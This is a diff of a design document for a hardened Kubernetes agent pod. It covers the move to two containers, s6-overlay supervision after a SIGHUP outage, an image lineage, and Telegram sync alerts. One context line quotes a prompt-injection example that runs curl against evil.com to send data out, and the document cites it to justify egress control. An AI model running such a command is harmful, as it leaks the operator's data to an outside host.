@@ -33,24 +33,49 @@ We stack every layer that survives. The main threats:
 | Plugin supply chain compromise | Critical | Container isolation + egress control |
 | Container escape | Critical | Talos hardened OS + non-root |
 
-## Architecture: Single Container, Multiple Processes
+## Architecture: Two Containers, Shared PVC
 
-The original Kali pod was a single root container with a ConfigMap startup script. The secure-agent-pod is a custom image with three supervised processes:
+The original Kali pod was a single root container with a ConfigMap startup script. The secure-agent-pod is now a **two-container pod** sharing a PVC, both built from a shared base lineage at [`derio-net/agent-images`](https://github.com/derio-net/agent-images):
 
 ```
 gpu-1 (i9, 128GB RAM)
 └── secure-agent-pod (replicas: 1, Recreate strategy)
-    ├── sshd (port 2222, user-mode, key-only auth)
-    ├── supercronic (non-root cron replacement)
-    └── vibe-kanban (local mode, SQLite, port 8081)
     │
-    ├── PVC: agent-home (50Gi, /home/claude)
+    ├── kali container — supervised by s6-overlay (PID 1 = /init)
+    │     ├── sshd (port 2222, user-mode, key-only auth)
+    │     └── supercronic (non-root cron replacement)
+    │   image: ghcr.io/derio-net/secure-agent-kali
+    │
+    ├── vk-local sidecar — tini PID 1
+    │     └── vibe-kanban (local mode, SQLite, port 8081)
+    │   image: ghcr.io/derio-net/vk-local
+    │
+    ├── PVC: agent-home (50Gi, /home/claude — mounted in both containers)
     ├── Secret: agent-ssh-keys → /etc/ssh-keys/
     ├── Secret: agent-configs → ~/.kube/configs/ (optional)
     └── ServiceAccount: agent-sa (cluster-admin)
 ```
 
 Everything runs as user `claude` (UID 1000). No root. No sudo. All capabilities dropped.
+
+### Three-tier image lineage
+
+The image lineage was flattened in the [`agents--restart-resilience`](https://github.com/derio-net/frank/blob/main/docs/superpowers/specs/2026-04-27--agents--restart-resilience-design.md) layer to share boot logic across a planned fleet of sibling agent pods:
+
+```
+agent-base                        # debian:bookworm-slim + kubectl/jq/git/curl/claude/gh
+  ├── agent-shell-base            # + s6-overlay v3, sshd, supercronic, tmux+mosh,
+  │     │                         #   tmux-resurrect, tmux-continuum, /etc/cont-init.d,
+  │     │                         #   /etc/services.d, /etc/cont-finish.d
+  │     └── secure-agent-kali     # + Kali repo + pentest tools + /opt/scripts + crontab
+  │                               #   --build-arg AGENT_USER=claude AGENT_HOME=/home/claude
+  │                               #   (overrides the parameterized default `agent`/`/home/agent`
+  │                               #    to keep the existing PV-resident state — see "the rename
+  │                               #    plan" for the future flip)
+  └── vk-local                    # tini PID 1 + vibe-kanban (no shell, no s6, no sshd)
+```
+
+`agent-shell-base` is the share-point: every future shell-driven agent pod (gemini, gpt, hermes, media-generation, …) will inherit from it and get s6-overlay, sshd, supercronic, the tmux persistence stack, and the cont-init.d / services.d / cont-finish.d skeleton for free. The default user/home are `agent`/`/home/agent`; secure-agent-kali keeps `claude`/`/home/claude` via build-arg parameterization to avoid a state-rewrite migration. New shell pods inherit the defaults and accrue no rename debt.
 
 ### Why VibeKanban?
 
@@ -176,7 +201,7 @@ Everything else is blocked. A prompt injection running `curl https://evil.com -d
 
 ## Process Supervision
 
-The entrypoint starts three processes and waits for any to exit:
+The original entrypoint was a three-line pattern:
 
 ```bash
 /usr/sbin/sshd -f /opt/sshd_config -D &
@@ -187,7 +212,45 @@ echo "[agent] ready (sshd on :2222, supercronic, vibe-kanban on :8081)"
 wait -n
 ```
 
-`wait -n` exits when the first child process dies, causing the container to exit and Kubernetes to restart it. This is simpler than a full process supervisor (s6, tini) and works well for a pod that should restart on any process failure.
+`wait -n` exits when the first child dies, the container exits, K8s restarts it. Simple, but with a sharp edge: every child runs in the entrypoint's pgroup, so a stray signal to one child can propagate to the whole pgroup and take everything with it.
+
+That bit on **2026-04-26 at 23:27**: the in-pod claude session manager SIGHUP'd supercronic, supercronic exited, `wait -n` returned, the container exited, mosh-server died with the container, the operator's tmux layout was gone. The image bumper re-rolled the pod 4.5h later for an unrelated reason and the same disruption replayed. Two real failures in a single day made the cost concrete.
+
+The fix: replace `wait -n` with **s6-overlay v3** as PID 1 (in `agent-shell-base`, inherited by `secure-agent-kali`). Each long-running service gets its own supervisor process and signal namespace. A misbehaving child can't take down a sibling.
+
+```
+/init                              # s6-overlay, PID 1
+  s6-svscan (supervisor manager)
+    s6-supervise sshd
+      /usr/sbin/sshd -f /opt/sshd_config -D
+    s6-supervise supercronic
+      supercronic /home/claude/.crontab
+        … cron-spawned children (claude session-manager, vk-bridge.py, …)
+```
+
+Vibe-kanban is **not** under s6 in the kali container — it moved to its own `vk-local` sidecar (running tini as PID 1) so the kali container only has to supervise services that share the SSH/cron lineage. The sidecar has its own restart cycle, its own readinessProbe, and shares the `/home/claude` PVC for the SQLite database.
+
+### Why s6-overlay (and not the alternatives)
+
+- **Container-lifecycle stages** (`cont-init.d` / `services.d` / `cont-finish.d`) match exactly what we need: one-shot setup separated from supervised long-runners separated from teardown. The pre-stop tmux save lives cleanly in `cont-finish.d/02-tmux-save`, after `cont-finish.d/01-shutdown` runs the `bridge:shutdown` drain.
+- **Crashloop bail policy** — 5 deaths within 60s → stop respawning that service, leave it down, keep other services running. Catches truly broken services (binary missing, config corrupt) without panicking on transient flaps. Telegram alerts on bail-out are out of scope for now; the K8s readinessProbe still catches sshd-down because the pod gets pulled from the LB.
+- **Real PID-1 init** that handles zombie reaping and signal forwarding correctly. The bash + `wait -n` pattern works, but it's the kind of thing that subtly breaks when refactored.
+- **Service dependencies (s6-rc)** become useful as soon as the second shell pod arrives — e.g., a credential-mount-ready barrier before a service starts.
+
+The full architecture (cont-init.d ordering, tmux persistence, parameterized AGENT_USER/AGENT_HOME, the why-not-jinja-snippets analysis) lives in the [restart-resilience spec](https://github.com/derio-net/frank/blob/main/docs/superpowers/specs/2026-04-27--agents--restart-resilience-design.md).
+
+### Bump alerts: ArgoCD Notifications → Telegram
+
+When ArgoCD syncs the secure-agent-pod Application (image bump from the lockstep bumper, or a manual rollout), the deployment uses `Recreate` strategy: the old pod tears down before the new one starts, which costs ~30s of mosh + tmux session disruption. To make that disruption announced rather than surprising, the secure-agent-pod Application is annotated to subscribe to two ArgoCD Notifications triggers:
+
+```yaml
+metadata:
+  annotations:
+    notifications.argoproj.io/subscribe.on-sync-running.webhook: telegram
+    notifications.argoproj.io/subscribe.on-sync-succeeded.webhook: telegram
+```
+
+The notifications controller (enabled in `apps/argocd/values.yaml`) fires a Telegram message via the webhook service when the sync starts (`🔄 …rolling out…`) and when it finishes (`✅ …synced`). The operator gets ~30s of heads-up before the mosh+tmux session needs to be re-spawned via WezTerm's Cmd+Shift+2 binding, which gives `cont-finish.d/02-tmux-save` time to write a final continuum snapshot before the container dies.
 
 ## Decommissioning the Old Kali Pod
 
